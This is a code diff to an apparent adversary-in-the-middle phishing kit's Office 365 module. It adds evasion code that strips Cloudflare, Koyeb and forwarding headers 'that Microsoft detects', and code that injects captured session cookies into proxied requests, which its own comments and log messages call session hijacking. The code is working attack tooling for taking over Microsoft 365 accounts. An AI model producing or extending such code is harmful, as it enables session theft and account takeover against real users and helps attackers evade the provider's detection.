@@ -883,8 +883,15 @@ class Office365Module(BaseModule):
             
             # Forward the request to Microsoft
             headers = {}
+            # Filter out proxy headers that Microsoft detects
+            blocked_headers = ['cf-ray', 'cf-connecting-ip', 'cf-visitor', 'cf-ipcountry', 'cdn-loop',
+                             'x-forwarded-for', 'x-forwarded-proto', 'x-forwarded-host', 'x-forwarded-server',
+                             'x-request-id', 'x-koyeb-route', 'x-koyeb-service-id', 'x-koyeb-host-port',
+                             'x-koyeb-original-host', 'x-koyeb-deployment-id', 'x-koyeb-glb',
+                             'x-envoy-original-path', 'x-koyeb-backend', 'x-b3-traceid', 'x-b3-spanid']
+            
             for key, value in flask_request.headers:
-                if key.lower() not in ['host', 'content-length']:
+                if key.lower() not in ['host', 'content-length'] and key.lower() not in blocked_headers:
                     headers[key] = value
             
             # Set proper User-Agent and other headers to avoid automation detection
@@ -909,7 +916,13 @@ class Office365Module(BaseModule):
             headers['Host'] = target_host_hdr
             # ------------------------------------------------------------
 
-            # Make the request to Microsoft (after injecting cookies)
+            # Inject captured cookies to maintain session for hijacking
+            if self.ms_cookie_jar:
+                cookie_header = '; '.join([f"{name}={value}" for name, value in self.ms_cookie_jar.items()])
+                headers['Cookie'] = cookie_header
+                self.log(f"[AiTM] Injecting {len(self.ms_cookie_jar)} session cookies")
+            
+            # Make the request to Microsoft (with session cookies for hijacking)
             if flask_request.method == 'POST':
                 resp = requests.post(target_url, headers=headers, data=flask_request.get_data(), 
                                    allow_redirects=False, timeout=30)
